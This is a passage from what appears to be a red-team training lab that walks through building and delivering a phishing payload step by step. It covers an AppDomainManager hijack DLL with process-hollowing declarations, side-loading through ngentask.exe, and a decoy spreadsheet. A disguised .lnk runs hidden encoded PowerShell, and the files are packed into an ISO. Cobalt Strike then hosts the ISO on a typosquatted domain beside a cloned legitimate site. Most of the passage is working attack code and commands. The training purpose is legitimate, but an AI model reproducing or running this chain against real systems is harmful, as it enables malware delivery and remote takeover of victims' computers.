+</li><li class="L4"><span class="pln">        </span><span class="pun">[</span><span class="typ">DllImport</span><span class="pun">(</span><span class="str">"KERNEL32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="typ">ExactSpelling</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">,</span><span class="pln"> </span><span class="typ">SetLastError</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">)]</span>
+</li><li class="L5"><span class="pln">        </span><span class="pun">[</span><span class="typ">DefaultDllImportSearchPaths</span><span class="pun">(</span><span class="typ">DllImportSearchPath</span><span class="pun">.</span><span class="typ">System32</span><span class="pun">)]</span>
+</li><li class="L6"><span class="pln">        </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">extern</span><span class="pln"> </span><span class="kwd">bool</span><span class="pln"> </span><span class="typ">WriteProcessMemory</span><span class="pun">(</span>
+</li><li class="L7"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> processHandle</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">            </span><span class="typ">IntPtr</span><span class="pln"> baseAddress</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">            </span><span class="kwd">byte</span><span class="pun">[]</span><span class="pln"> buffer</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">            </span><span class="kwd">int</span><span class="pln"> size</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">            </span><span class="kwd">out</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> numberOfBytesWritten</span><span class="pun">);</span>
+</li><li class="L2"><span class="pln">&nbsp;</span>
+</li><li class="L3"><span class="pln">        </span><span class="pun">[</span><span class="typ">DllImport</span><span class="pun">(</span><span class="str">"KERNEL32.dll"</span><span class="pun">,</span><span class="pln"> </span><span class="typ">ExactSpelling</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">,</span><span class="pln"> </span><span class="typ">SetLastError</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">true</span><span class="pun">)]</span>
+</li><li class="L4"><span class="pln">        </span><span class="pun">[</span><span class="typ">DefaultDllImportSearchPaths</span><span class="pun">(</span><span class="typ">DllImportSearchPath</span><span class="pun">.</span><span class="typ">System32</span><span class="pun">)]</span>
+</li><li class="L5"><span class="pln">        </span><span class="kwd">private</span><span class="pln"> </span><span class="kwd">static</span><span class="pln"> </span><span class="kwd">extern</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> </span><span class="typ">ResumeThread</span><span class="pun">(</span><span class="typ">IntPtr</span><span class="pln"> threadHandle</span><span class="pun">);</span>
+</li><li class="L6"><span class="pln">    </span><span class="pun">}</span>
+</li><li class="L7"><span class="pln">&nbsp;</span>
+</li><li class="L8"><span class="pln">    </span><span class="pun">[</span><span class="typ">Flags</span><span class="pun">]</span>
+</li><li class="L9"><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">enum</span><span class="pln"> PROCESS_CREATION_FLAGS </span><span class="pun">:</span><span class="pln"> </span><span class="kwd">uint</span>
+</li><li class="L0"><span class="pln">    </span><span class="pun">{</span>
+</li><li class="L1"><span class="pln">        DEBUG_PROCESS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000001</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">        DEBUG_ONLY_THIS_PROCESS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000002</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">        CREATE_SUSPENDED </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000004</span><span class="pun">,</span>
+</li><li class="L4"><span class="pln">        DETACHED_PROCESS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000008</span><span class="pun">,</span>
+</li><li class="L5"><span class="pln">        CREATE_NEW_CONSOLE </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000010</span><span class="pun">,</span>
+</li><li class="L6"><span class="pln">        NORMAL_PRIORITY_CLASS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000020</span><span class="pun">,</span>
+</li><li class="L7"><span class="pln">        IDLE_PRIORITY_CLASS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000040</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">        HIGH_PRIORITY_CLASS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000080</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">        REALTIME_PRIORITY_CLASS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000100</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">        CREATE_NEW_PROCESS_GROUP </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000200</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">        CREATE_UNICODE_ENVIRONMENT </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000400</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">        CREATE_SEPARATE_WOW_VDM </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000800</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">        CREATE_SHARED_WOW_VDM </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00001000</span><span class="pun">,</span>
+</li><li class="L4"><span class="pln">        CREATE_FORCEDOS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00002000</span><span class="pun">,</span>
+</li><li class="L5"><span class="pln">        BELOW_NORMAL_PRIORITY_CLASS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00004000</span><span class="pun">,</span>
+</li><li class="L6"><span class="pln">        ABOVE_NORMAL_PRIORITY_CLASS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00008000</span><span class="pun">,</span>
+</li><li class="L7"><span class="pln">        INHERIT_PARENT_AFFINITY </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00010000</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">        INHERIT_CALLER_PRIORITY </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00020000</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">        CREATE_PROTECTED_PROCESS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00040000</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">        EXTENDED_STARTUPINFO_PRESENT </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00080000</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">        PROCESS_MODE_BACKGROUND_BEGIN </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00100000</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">        PROCESS_MODE_BACKGROUND_END </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00200000</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">        CREATE_SECURE_PROCESS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00400000</span><span class="pun">,</span>
+</li><li class="L4"><span class="pln">        CREATE_BREAKAWAY_FROM_JOB </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x01000000</span><span class="pun">,</span>
+</li><li class="L5"><span class="pln">        CREATE_PRESERVE_CODE_AUTHZ_LEVEL </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x02000000</span><span class="pun">,</span>
+</li><li class="L6"><span class="pln">        CREATE_DEFAULT_ERROR_MODE </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x04000000</span><span class="pun">,</span>
+</li><li class="L7"><span class="pln">        CREATE_NO_WINDOW </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x08000000</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">        PROFILE_USER </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x10000000</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">        PROFILE_KERNEL </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x20000000</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">        PROFILE_SERVER </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x40000000</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">        CREATE_IGNORE_SYSTEM_DEFAULT </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x80000000</span>
+</li><li class="L2"><span class="pln">    </span><span class="pun">}</span>
+</li><li class="L3"><span class="pln">&nbsp;</span>
+</li><li class="L4"><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">struct</span><span class="pln"> STARTUPINFOA</span>
+</li><li class="L5"><span class="pln">    </span><span class="pun">{</span>
+</li><li class="L6"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> cb</span><span class="pun">;</span>
+</li><li class="L7"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">string</span><span class="pln"> lpReserved</span><span class="pun">;</span>
+</li><li class="L8"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">string</span><span class="pln"> lpDesktop</span><span class="pun">;</span>
+</li><li class="L9"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">string</span><span class="pln"> lpTitle</span><span class="pun">;</span>
+</li><li class="L0"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwX</span><span class="pun">;</span>
+</li><li class="L1"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwY</span><span class="pun">;</span>
+</li><li class="L2"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwXSize</span><span class="pun">;</span>
+</li><li class="L3"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwYSize</span><span class="pun">;</span>
+</li><li class="L4"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwXCountChars</span><span class="pun">;</span>
+</li><li class="L5"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwYCountChars</span><span class="pun">;</span>
+</li><li class="L6"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwFillAttribute</span><span class="pun">;</span>
+</li><li class="L7"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> STARTUPINFO_FLAGS dwFlags</span><span class="pun">;</span>
+</li><li class="L8"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">ushort</span><span class="pln"> wShowWindow</span><span class="pun">;</span>
+</li><li class="L9"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">ushort</span><span class="pln"> cbReserved2</span><span class="pun">;</span>
+</li><li class="L0"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IntPtr</span><span class="pln"> lpReserved2</span><span class="pun">;</span>
+</li><li class="L1"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IntPtr</span><span class="pln"> hStdInput</span><span class="pun">;</span>
+</li><li class="L2"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IntPtr</span><span class="pln"> hStdOutput</span><span class="pun">;</span>
+</li><li class="L3"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IntPtr</span><span class="pln"> hStdError</span><span class="pun">;</span>
+</li><li class="L4"><span class="pln">    </span><span class="pun">}</span>
+</li><li class="L5"><span class="pln">&nbsp;</span>
+</li><li class="L6"><span class="pln">    </span><span class="pun">[</span><span class="typ">Flags</span><span class="pun">]</span>
+</li><li class="L7"><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">enum</span><span class="pln"> STARTUPINFO_FLAGS </span><span class="pun">:</span><span class="pln"> </span><span class="kwd">uint</span>
+</li><li class="L8"><span class="pln">    </span><span class="pun">{</span>
+</li><li class="L9"><span class="pln">        STARTF_FORCEONFEEDBACK </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000040</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">        STARTF_FORCEOFFFEEDBACK </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000080</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">        STARTF_PREVENTPINNING </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00002000</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">        STARTF_RUNFULLSCREEN </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000020</span><span class="pun">,</span>
+</li><li class="L3"><span class="pln">        STARTF_TITLEISAPPID </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00001000</span><span class="pun">,</span>
+</li><li class="L4"><span class="pln">        STARTF_TITLEISLINKNAME </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000800</span><span class="pun">,</span>
+</li><li class="L5"><span class="pln">        STARTF_UNTRUSTEDSOURCE </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00008000</span><span class="pun">,</span>
+</li><li class="L6"><span class="pln">        STARTF_USECOUNTCHARS </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000008</span><span class="pun">,</span>
+</li><li class="L7"><span class="pln">        STARTF_USEFILLATTRIBUTE </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000010</span><span class="pun">,</span>
+</li><li class="L8"><span class="pln">        STARTF_USEHOTKEY </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000200</span><span class="pun">,</span>
+</li><li class="L9"><span class="pln">        STARTF_USEPOSITION </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000004</span><span class="pun">,</span>
+</li><li class="L0"><span class="pln">        STARTF_USESHOWWINDOW </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000001</span><span class="pun">,</span>
+</li><li class="L1"><span class="pln">        STARTF_USESIZE </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000002</span><span class="pun">,</span>
+</li><li class="L2"><span class="pln">        STARTF_USESTDHANDLES </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x00000100</span>
+</li><li class="L3"><span class="pln">    </span><span class="pun">}</span>
+</li><li class="L4"><span class="pln">&nbsp;</span>
+</li><li class="L5"><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">struct</span><span class="pln"> PROCESS_INFORMATION</span>
+</li><li class="L6"><span class="pln">    </span><span class="pun">{</span>
+</li><li class="L7"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IntPtr</span><span class="pln"> hProcess</span><span class="pun">;</span>
+</li><li class="L8"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IntPtr</span><span class="pln"> hThread</span><span class="pun">;</span>
+</li><li class="L9"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwProcessId</span><span class="pun">;</span>
+</li><li class="L0"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> dwThreadId</span><span class="pun">;</span>
+</li><li class="L1"><span class="pln">    </span><span class="pun">}</span>
+</li><li class="L2"><span class="pln">&nbsp;</span>
+</li><li class="L3"><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">enum</span><span class="pln"> PROCESSINFOCLASS</span>
+</li><li class="L4"><span class="pln">    </span><span class="pun">{</span>
+</li><li class="L5"><span class="pln">        </span><span class="typ">ProcessBasicInformation</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span>
+</li><li class="L6"><span class="pln">    </span><span class="pun">}</span>
+</li><li class="L7"><span class="pln">&nbsp;</span>
+</li><li class="L8"><span class="pln">    </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">struct</span><span class="pln"> PROCESS_BASIC_INFORMATION</span>
+</li><li class="L9"><span class="pln">    </span><span class="pun">{</span>
+</li><li class="L0"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">uint</span><span class="pln"> </span><span class="typ">ExitStatus</span><span class="pun">;</span>
+</li><li class="L1"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IntPtr</span><span class="pln"> </span><span class="typ">PebBaseAddress</span><span class="pun">;</span>
+</li><li class="L2"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">ulong</span><span class="pln"> </span><span class="typ">AffinityMask</span><span class="pun">;</span>
+</li><li class="L3"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> </span><span class="typ">BasePriority</span><span class="pun">;</span>
+</li><li class="L4"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">ulong</span><span class="pln"> </span><span class="typ">UniqueProcessId</span><span class="pun">;</span>
+</li><li class="L5"><span class="pln">        </span><span class="kwd">public</span><span class="pln"> </span><span class="kwd">ulong</span><span class="pln"> </span><span class="typ">InheritedFromUniqueProcessId</span><span class="pun">;</span>
+</li><li class="L6"><span class="pln">    </span><span class="pun">}</span>
+</li><li class="L7"><span class="pun">}</span>
+</li></ol></code></pre>
+<blockquote class="expandable hint">
+                                <details>
+                                    <summary>Process Hollowing</summary>
+                                    
+  
+  <p>This is the process hollowing code from the Malware Essentials chapter.</p>
+
+                                </details>
+                            </blockquote></li>
+<li class="task-list-item" id="taskIndex9"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex9"><span></span></label> Build the project in Release mode.</p>
+<p>The DLL should be written to the following path: <em>C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll</em>.</p>
+<blockquote class="alert" role="alert">
+  <p>If your path contains something like <em>net8.0</em>, then you chose the wrong project type on step 2.</p>
+</blockquote></li>
+<li class="task-list-item" id="taskIndex10"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex10"><span></span></label> Go ahead and copy the DLL to the deals payload directory.</p>
+<pre><div class="codeTitle"><span class="title">Terminal</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="Terminal-nocolor language-Terminal-nocolor nocode prettyprint prettyprinted" tabindex="0" style="">cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
+</code></pre></li>
+</ol>
+</div><div class="page" id="page2">
+<h2 id="ngentask">NGenTask</h2>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex11"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex11"><span></span></label> Copy the SxS version of ngentask.exe into the deals payload directory.</p>
+<pre><div class="codeTitle"><span class="title">Terminal</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="Terminal-nocolor language-Terminal-nocolor nocode prettyprint prettyprinted" tabindex="0" style="">cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
+</code></pre></li>
+</ol>
+<h3 id="sanity-test">Sanity test</h3>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex12"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex12"><span></span></label> Launch Cobalt Strike and connect to the team server.</p></li>
+<li class="task-list-item" id="taskIndex13"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex13"><span></span></label> Move into the deals payload directory and set the AppDomain environment variables:</p>
+<pre><div class="codeTitle"><span class="title">PowerShell</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="PowerShell-linenums language-PowerShell-linenums prettyprint prettyprinted" tabindex="0" style=""><ol class="linenums"><li class="L0"><span class="pln">cd C</span><span class="pun">:</span><span class="pln">\Payloads\deals</span>
+</li><li class="L1"><span class="pln">$env</span><span class="pun">:</span><span class="pln">APPDOMAIN_MANAGER_TYPE </span><span class="pun">=</span><span class="pln"> </span><span class="str">'AppDomainHijack.DomainManager'</span>
+</li><li class="L2"><span class="pln">$env</span><span class="pun">:</span><span class="pln">APPDOMAIN_MANAGER_ASM </span><span class="pun">=</span><span class="pln"> </span><span class="str">'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'</span>
+</li></ol></code></pre></li>
+<li class="task-list-item" id="taskIndex14"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex14"><span></span></label> Run <span class="typeText" title="Type Text" tabindex="0" role="button">.\ngentask.exe</span></p>
+<blockquote class="hint">
+  <p>A new Beacon should appear, running in msedge.exe.</p>
+</blockquote></li>
+</ol>
+</div><div class="page selected" id="page3">
+<h1 id="decoy">Decoy</h1>
+<p>Next, create a decoy file.</p>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex15"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex15"><span></span></label> Open Excel and create a new blank workbook.</p>
+<blockquote class="hint">
+  <p>If you cannot create a workbook, close Excel, launch Terminal as a local admin, and run the following command: <span class="typeText" title="Type Text" tabindex="0" role="button">&amp; "C:\Program Files\Microsoft Office\root\Office16\OSPPREARM.EXE"</span></p>
+</blockquote></li>
+<li class="task-list-item" id="taskIndex16"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex16"><span></span></label> Add some dummy deals data.</p>
+<pre><div class="codeTitle"><span class="title">xlsx</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="xlsx-nocolor language-xlsx-nocolor nocode prettyprint prettyprinted" tabindex="0" style="">id  product      discount  code
+1   Prodder      56%       54473-150
+2   Viva         9%        0378-5713
+3   Aerified     22%       43742-0187
+4   Zaam-Dox     26%       35356-687
+5   Rank         41%       63323-300
+6   Pannier      61%       50804-302
+7   Wrapsafe     32%       67046-223
+8   Voltsillam   58%       55910-721
+9   Ventosanzap  4%        0485-0051
+10  Otcom        54%       36987-2281
+</code></pre></li>
+<li class="task-list-item" id="taskIndex17"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex17"><span></span></label> Save the workbook as <em>C:\Payloads\deals\deals.xlsx</em>.</p></li>
+<li class="task-list-item" id="taskIndex18"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex18"><span></span></label> Close Excel.</p></li>
+</ol>
+</div><div class="page" id="page4">
+<h1 id="trigger">Trigger</h1>
+<p>Now for the trigger. The user will run this which will subsequently launch the decoy and payload at the same time.</p>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex19"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex19"><span></span></label> Generate a PowerShell one-liner that will set the required environment variables and execute ngentask.exe.</p>
+<pre><div class="codeTitle"><span class="title">PowerShell</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="PowerShell-linenums language-PowerShell-linenums prettyprint prettyprinted" tabindex="0" style=""><ol class="linenums"><li class="L0"><span class="pln">cd C</span><span class="pun">:</span><span class="pln">\Payloads\deals\</span>
+</li><li class="L1"><span class="pln">$cmd </span><span class="pun">=</span><span class="pln"> </span><span class="str">'$env:APPDOMAIN_MANAGER_TYPE = "AppDomainHijack.DomainManager"; $env:APPDOMAIN_MANAGER_ASM = "AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"; .\ngentask.exe'</span>
+</li><li class="L2"><span class="pln">$enc </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="typ">System</span><span class="pun">.</span><span class="typ">Convert</span><span class="pun">]::</span><span class="typ">ToBase64String</span><span class="pun">([</span><span class="typ">System</span><span class="pun">.</span><span class="typ">Text</span><span class="pun">.</span><span class="typ">Encoding</span><span class="pun">]::</span><span class="typ">Unicode</span><span class="pun">.</span><span class="typ">GetBytes</span><span class="pun">(</span><span class="pln">$cmd</span><span class="pun">))</span>
+</li></ol></code></pre></li>
+<li class="task-list-item" id="taskIndex20"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex20"><span></span></label> In the same window, create the shortcut that will execute the above one-liner and open the decoy.</p>
+<pre><div class="codeTitle"><span class="title">PowerShell</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="PowerShell-linenums language-PowerShell-linenums prettyprint prettyprinted" tabindex="0" style=""><ol class="linenums"><li class="L0"><span class="pln">$wsh </span><span class="pun">=</span><span class="pln"> </span><span class="typ">New</span><span class="pun">-</span><span class="typ">Object</span><span class="pln"> </span><span class="pun">-</span><span class="typ">ComObject</span><span class="pln"> </span><span class="typ">WScript</span><span class="pun">.</span><span class="typ">Shell</span>
+</li><li class="L1"><span class="pln">$lnk </span><span class="pun">=</span><span class="pln"> $wsh</span><span class="pun">.</span><span class="typ">CreateShortcut</span><span class="pun">(</span><span class="str">"C:\Payloads\deals\deals.xlsx.lnk"</span><span class="pun">)</span>
+</li><li class="L2"><span class="pln">$lnk</span><span class="pun">.</span><span class="typ">TargetPath</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">"%COMSPEC%"</span>
+</li><li class="L3"><span class="pln">$lnk</span><span class="pun">.</span><span class="typ">Arguments</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">"/C start deals.xlsx &amp;&amp; %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -enc $enc"</span>
+</li><li class="L4"><span class="pln">$lnk</span><span class="pun">.</span><span class="typ">IconLocation</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="str">"%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"</span>
+</li><li class="L5"><span class="pln">$lnk</span><span class="pun">.</span><span class="typ">Save</span><span class="pun">()</span>
+</li></ol></code></pre></li>
+</ol>
+<h2 id="another-sanity-test">Another sanity test</h2>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex21"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex21"><span></span></label> Open Explorer and navigate to <em>C:\Payloads\deals</em>.</p></li>
+<li class="task-list-item" id="taskIndex22"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex22"><span></span></label> Double-click on <em>deals.xlsx.lnk</em>.</p>
+<blockquote class="hint">
+  <p>The spreadsheet will open and a new Beacon should appear at the same time.</p>
+</blockquote></li>
+</ol>
+</div><div class="page" id="page5">
+<h1 id="container">Container</h1>
+<p>It's time to package all of our files.  We want to hide everything, except the lnk trigger.</p>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex23"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex23"><span></span></label> Open Ubuntu (WSL) in Terminal, and use PackMyPayload to package all the files into an ISO.</p>
+<pre><div class="codeTitle"><span class="title">ubuntu</span><div class="titleActions"><span class="type-code-block" role="button" tabindex="0" aria-label="Type code">Type</span><span class="copy-code-block" role="button" tabindex="0" aria-label="Copy code">Copy</span></div></div><code class="ubuntu-nocolor language-ubuntu-nocolor nocode prettyprint prettyprinted" tabindex="0" style="">python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
+</code></pre></li>
+</ol>
+<h2 id="final-sanity-test">Final sanity test</h2>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex24"><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex24"><span></span></label> Double-click on the ISO to mount it and you should only see the trigger.</li>
+<li class="task-list-item" id="taskIndex25"><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex25"><span></span></label> Double-click on the trigger a final time, and the decoy and Beacon should appear.</li>
+</ol>
+</div><div class="page" id="page6">
+<h1 id="delivery">Delivery</h1>
+<p>We're finally ready to deliver the payload to the victim.</p>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex26"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex26"><span></span></label> Host the ISO on Cobalt Strike's built-in web server.</p>
+<ol>
+<li>Go to <strong>Site Management &gt; Host File</strong>.</li>
+<li>File: <span class="typeText" title="Type Text" tabindex="0" role="button">C:\Payloads\deals\deals.iso</span></li>
+<li>Local URI: <span class="typeText" title="Type Text" tabindex="0" role="button">/deals.iso</span></li>
+<li>Local Host: <span class="typeText" title="Type Text" tabindex="0" role="button">www.bleepincomputer.com</span></li>
+<li>Click <strong>Launch</strong>.</li></ol></li>
+<li class="task-list-item" id="taskIndex27"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex27"><span></span></label> Clone a legitimate web page.</p>
+<ol>
+<li><strong>Go to Site Management &gt; Clone Site</strong> </li>
+<li>Clone URL: <span class="typeText" title="Type Text" tabindex="0" role="button">https://deals.bleepingcomputer.com</span></li>
+<li>Local URI: <span class="typeText" title="Type Text" tabindex="0" role="button">/deals</span></li>
+<li>Local Host: <span class="typeText" title="Type Text" tabindex="0" role="button">www.bleepincomputer.com</span></li>
+<li>Attack: Click the <strong>…</strong> button and select the hosted ISO.</li>
+<li>Click <strong>Clone</strong>.</li></ol></li>
